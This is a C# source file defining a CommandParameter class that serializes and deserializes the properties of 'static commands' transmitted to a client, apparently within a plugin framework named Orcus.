using System;
using System.Collections.Generic;
using System.Linq;
using Orcus.Plugins.PropertyGrid;
using Orcus.Shared.Core;
using Orcus.Shared.NetSerializer;

namespace Orcus.Plugins.StaticCommands
{
    /// <summary>
    ///     Represents the parameter which is transmitted to the client
    /// </summary>
    public class CommandParameter
    {
        /// <summary>
        ///     Initialize a new <see cref="CommandParameter" /> with a byte array
        /// </summary>
        /// <param name="parameterData">The data which should get transmitted</param>
        public CommandParameter(byte[] parameterData)
        {
            Data = parameterData;
        }

        /// <summary>
        ///     The data provided by the command parameter
        /// </summary>
        public byte[] Data { get; }

        /// <summary>
        ///     Initialize the command parameter from properties
        /// </summary>
        /// <param name="commandProperties">The properties which should get transmitted</param>
        /// <returns></returns>
        public static CommandParameter FromProperties(List<IProperty> commandProperties)
        {
            if (commandProperties.Count == 0)
                return new CommandParameter(null);

            var properties = commandProperties.Select(x => x.ToPropertyNameValue()).ToList();
            var types = new List<Type>(commandProperties.Select(x => x.PropertyType).Where(x => x != null))
            {
                typeof (List<PropertyNameValue>)
            };

            return new CommandParameter(new Serializer(types).Serialize(properties));
        }

        /// <summary>
        ///     Initialize the command parameter from <see cref="StaticCommand" />. All <see cref="StaticCommand.Properties" />
        ///     will be serialized and transmitted
        /// </summary>
        /// <param name="staticCommand">The static command the properties should get taken from</param>
        /// <returns></returns>
        public static CommandParameter FromProperties(StaticCommand staticCommand)
        {
            return FromProperties(staticCommand.Properties);
        }

        /// <summary>
        ///     If this command parameter was initialized with properties (<see cref="FromProperties(List{IProperty})" />), this
        ///     command will intialize the transfered properties on the <see cref="StaticCommand" />
        /// </summary>
        /// <param name="staticCommand">The static command which will get the transfered properties</param>
        public void InitializeProperties(StaticCommand staticCommand)
        {
            if (Data == null)
                return;

            var types =
                new List<Type>(staticCommand.Properties.Select(x => x.PropertyType).Where(x => x != null))
                {
                    typeof (List<PropertyNameValue>)
                };

            var result =
                new Serializer(types).Deserialize<List<PropertyNameValue>>(Data);

            PropertyGridExtensions.InitializeProperties(staticCommand, result);
        }
    }
}